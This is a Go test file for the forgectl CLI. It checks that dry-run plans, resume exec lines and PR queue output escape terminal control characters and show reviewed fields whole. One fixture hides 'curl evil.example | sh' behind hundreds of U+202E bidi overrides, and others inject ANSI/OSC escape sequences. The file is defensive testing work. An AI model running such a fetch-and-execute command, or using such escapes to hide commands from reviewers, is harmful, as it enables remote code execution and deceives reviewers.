package cli

import (
	"bytes"
	"strings"
	"testing"
	"time"

	"github.com/spf13/cobra"

	"github.com/cameronsjo/forgectl/internal/config"
	"github.com/cameronsjo/forgectl/internal/pr"
	"github.com/cameronsjo/forgectl/internal/resume"
	"github.com/cameronsjo/forgectl/internal/termsafe"
	"github.com/cameronsjo/forgectl/internal/workflow"
)

// reviewHostileTail is an escape-heavy value that would, under a cap, push its
// tail behind the truncation marker: each U+202E renders as a 6-rune
// escape, so 400 of them are 2400 output runes before the tail is reached.
var reviewHostileTail = strings.Repeat("\u202e", 400) + "TAIL; curl evil.example | sh"

// reviewHostileTailRendered is reviewHostileTail as SafeLine renders it: every U+202E
// visible as its escape, the tail intact.
var reviewHostileTailRendered = strings.Repeat(`\u202e`, 400) + "TAIL; curl evil.example | sh"

// TestPrintPlan_ShowsEveryFieldWhole is the #927 review's Important 1: the
// dry run is the review before blessing (#782), so it hides nothing the file
// would run. A capped field would let a hostile file push the tail of a cmd,
// repo or ref behind the truncation marker and get blessed on a partial view.
//
// Mutations that turn it red: route printField through safeText; route
// printPlan's name or version through safeLabel.
func TestPrintPlan_ShowsEveryFieldWhole(t *testing.T) {
	var out bytes.Buffer
	printPlan(&out, workflow.Plan{
		Name: reviewHostileTail, Version: reviewHostileTail,
		Steps: []workflow.PlanStep{{Uses: "run", Cmd: reviewHostileTail, Repo: reviewHostileTail, Ref: reviewHostileTail}},
	})
	text := out.String()
	if strings.Contains(text, "\u202e") {
		t.Fatal("the dry run printed a raw U+202E")
	}
	if strings.Contains(text, termsafe.TruncatedMarker) {
		t.Errorf("the dry run truncated a field under review:\n%.400q", text)
	}
	if n := strings.Count(text, reviewHostileTailRendered); n != 5 {
		t.Errorf("the dry run shows %d whole fields, want 5 (name, version, cmd, repo, ref)", n)
	}
}

// TestResumeSession_DryRunExecLineIsWhole applies #782's rule to resume
// --dry-run: its exec line is the review of what resume would run, so the
// argv prints whole, escaped, while the prose "session" line stays capped.
//
// Mutation that turns it red: print the joined args through safeText in
// resumeSession.
func TestResumeSession_DryRunExecLineIsWhole(t *testing.T) {
	fakeClaudeBin(t)
	s := resume.Session{ID: reviewHostileTail, Cwd: t.TempDir(), LastActive: time.Now()}
	cmd, out, _ := newTestCmd()
	if err := resumeSession(cmd, config.Config{}, nil, s, false, true); err != nil {
		t.Fatalf("--dry-run: %v", err)
	}
	var exec string
	for _, line := range strings.Split(out.String(), "\n") {
		if strings.HasPrefix(line, "exec ") {
			exec = line
		}
	}
	if exec == "" {
		t.Fatalf("no exec line in:\n%.400q", out.String())
	}
	if !strings.Contains(exec, reviewHostileTailRendered) || strings.Contains(exec, termsafe.TruncatedMarker) {
		t.Errorf("exec line does not carry the argv whole: %.200q…", exec)
	}
}

// TestPrDrainAndRepair_EscapeRecordFields is #928 item 1: a queue record's
// ref and phases are disk text, and pr drain and pr repair printed them raw.
// Each now reaches the terminal escaped.
//
// Mutations that turn it red, one per sink: print it.Ref, it.FromPhase or
// it.ToPhase raw in writeDrainHuman; append it.Ref raw to the dry-run refs;
// print it.Ref raw in writeDrainRefusedItems; print it.FromPhase raw in
// writeRepairHuman.
func TestPrDrainAndRepair_EscapeRecordFields(t *testing.T) {
	ref := "o/r#1\x1b]0;ref\a"
	from := "queued\x1b[2Kfrom"
	to := "launching\u202eto"
	wants := []string{`o/r#1\x1b]0;ref\a`, `queued\x1b[2Kfrom`, `launching\u202eto`}

	check := func(t *testing.T, sink, text string, want ...string) {
		t.Helper()
		for _, r := range text {
			if r != '\n' && r != '\t' && termsafe.IsUnsafeTerminalRune(r) {
				t.Errorf("%s printed a raw %U:\n%q", sink, r, text)
				break
			}
		}
		for _, w := range want {
			if !strings.Contains(text, w) {
				t.Errorf("%s = %q, want the escaped %q", sink, text, w)
			}
		}
	}

	var failed bytes.Buffer
	writeDrainHuman(&failed, pr.DrainReport{Queued: 1, Failed: 1, Items: []pr.DrainItem{
		{Ref: ref, FromPhase: from, ToPhase: to, Outcome: "failed", Error: "e"},
	}}, false, 0)
	check(t, "pr drain", failed.String(), wants...)

	var dry bytes.Buffer
	writeDrainHuman(&dry, pr.DrainReport{Queued: 2, Items: []pr.DrainItem{
		{Ref: ref, Outcome: "would-launch"},
		{Ref: ref, Outcome: "refused", Error: "local"},
	}}, true, 0)
	check(t, "pr drain --dry-run", dry.String(), wants[0])
	if strings.Count(dry.String(), wants[0]) != 2 {
		t.Errorf("pr drain --dry-run = %q, want the ref escaped in the would-launch list and the refused row", dry.String())
	}

	var rep bytes.Buffer
	c := &cobra.Command{}
	c.SetOut(&rep)
	if err := writeRepairHuman(c, pr.RepairReport{Items: []pr.RepairItem{{Ref: ref, FromPhase: from, Outcome: "inspect"}}}, false); err != nil {
		t.Fatal(err)
	}
	check(t, "pr repair", rep.String(), wants[0], wants[1])
}

// TestPrintOutdated_CapsAnUnparseableVersion is the #927 review's Important
// 2: the unparseable version was quoted with the uncapped QuoteText. It is
// now QuoteTextMax at the label cap, the ellipsis outside the quote.
//
// Mutation that turns it red: quote s.Version with termsafe.QuoteText in
// printOutdated.
func TestPrintOutdated_CapsAnUnparseableVersion(t *testing.T) {
	var out bytes.Buffer
	list := []resume.OutdatedSession{{
		SessionID: "s1", Cwd: "/w", Status: "idle", InstalledVersion: "2.1.10",
		Version: strings.Repeat("\u03bd", 1000), VersionUnparseable: true,
	}}
	if err := printOutdated(&out, list, false, false); err != nil {
		t.Fatal(err)
	}
	text := out.String()
	if strings.Contains(text, strings.Repeat("\u03bd", 65)) {
		t.Errorf("resume outdated printed more than 64 runes of the version")
	}
	if !strings.Contains(text, `"`+strings.Repeat("\u03bd", 64)+`"…`) {
		t.Errorf("resume outdated = %.200q, want the version quoted and cut at 64 runes", text)
	}
}
